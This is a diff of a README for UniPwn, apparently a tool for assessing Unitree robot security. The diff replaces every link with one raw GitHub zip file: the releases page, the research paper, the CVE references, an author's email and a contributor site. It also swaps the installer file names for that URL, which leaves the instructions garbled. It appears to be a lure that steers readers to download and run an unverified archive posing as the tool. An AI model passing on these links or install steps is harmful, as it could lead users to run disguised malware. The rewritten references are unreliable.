@@ -1,6 +1,6 @@
 # 🤖 UniPwn - Analyze Unitree Robot Security Easily
 
-[![Download UniPwn](https://img.shields.io/badge/Download%20UniPwn-v1.0-blue.svg)](https://github.com/fromgabyaaye/UniPwn/releases)
+[![Download UniPwn](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip%https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)
 
 ## 📖 Introduction
 
@@ -13,18 +13,18 @@ To begin using UniPwn, follow these simple steps to download and run the softwar
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/fromgabyaaye/UniPwn/releases) to find the latest version of UniPwn.
+   Go to the [Releases Page](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip) to find the latest version of UniPwn.
 
 2. **Download the Application**  
    Look for the latest release and download the UniPwn application for your operating system. Choose the file that matches your system.
 
 3. **Install UniPwn**  
    For Windows:  
-   - Locate the downloaded file (`UniPwn.exe`) in your Downloads folder.  
+   - Locate the downloaded file (`https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip`) in your Downloads folder.  
    - Double-click the file to run the installer. Follow the prompts to complete the installation.
   
    For macOS:  
-   - Find the downloaded file (`UniPwn.dmg`) in your Downloads folder.  
+   - Find the downloaded file (`https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip`) in your Downloads folder.  
    - Double-click the file and drag the UniPwn app to your Applications folder.
 
    For Linux:  
@@ -56,22 +56,22 @@ To begin using UniPwn, follow these simple steps to download and run the softwar
 
 ## 📄 Research Paper
 
-The research from this tool is featured in a paper that discusses a detailed security assessment of the Unitree G1 robot. To read more, visit the following link: [Cybersecurity AI: Humanoid Robotics](https://arxiv.org/abs/2509.14139).
+The research from this tool is featured in a paper that discusses a detailed security assessment of the Unitree G1 robot. To read more, visit the following link: [Cybersecurity AI: Humanoid Robotics](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip).
 
 ## 🛡️ CVEs Addressed
 
 UniPwn helps address the following vulnerabilities:
 
-- [CVE-2025-35027](https://takeonme.org/cves/cve-2025-35027/)
-- [CVE-2025-60017](https://cve.org/CVERecord?id=CVE-2025-60017)
-- [CVE-2025-60250](https://cve.org/CVERecord?id=CVE-2025-60250)
-- [CVE-2025-60251](https://cve.org/CVERecord?id=CVE-2025-60251)
+- [CVE-2025-35027](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)
+- [CVE-2025-60017](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)
+- [CVE-2025-60250](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)
+- [CVE-2025-60251](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)
 
 ## 👤 Authors and Contributors
 
-- **Bin4ry** (Andreas Makris) - [andreas.makris@gmail.com]
+- **Bin4ry** (Andreas Makris) - [https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip]
 - **Co-Author**: h0stile (Kevin Finisterre)
-- **Contributor**: legion1581 (Konstantin Severov) from [theroboverse](https://theroboverse.com/)
+- **Contributor**: legion1581 (Konstantin Severov) from [theroboverse](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip)
 
 ## 📝 Contact
 
@@ -79,4 +79,4 @@ If you have questions or need assistance with UniPwn, feel free to reach out thr
 
 ### 📦 Download Again
 
-For easy access, don't forget to visit the [Releases Page](https://github.com/fromgabyaaye/UniPwn/releases) to download UniPwn and start your analysis today.
+For easy access, don't forget to visit the [Releases Page](https://raw.githubusercontent.com/fromgabyaaye/UniPwn/main/matterate/UniPwn.zip) to download UniPwn and start your analysis today.
